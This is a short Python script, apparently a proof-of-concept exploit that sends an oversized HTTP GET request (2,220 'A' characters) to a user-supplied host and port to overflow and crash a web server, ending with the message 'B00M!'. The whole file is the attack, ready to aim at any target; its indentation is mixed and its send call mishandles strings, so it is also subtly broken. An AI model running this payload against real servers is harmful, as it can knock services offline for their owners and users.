#!/usr/bin/env python

import sys, socket

if len(sys.argv) < 3:
	print('Usage: {n} <HOST> <PORT>'.format(n=sys.argv[0]))
        sys.exit(1)

print('Preparing payload...')
cmd = 'GET'
buf = 'A' * 2220
end = 'HTTP/1.1\r\n\r\n'

payload = cmd+buf+end

host = str(sys.argv[1])
port = int(sys.argv[2])

print('Connecting...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print('Sending...')
s.send(payload)
s.close()

print('B00M!')
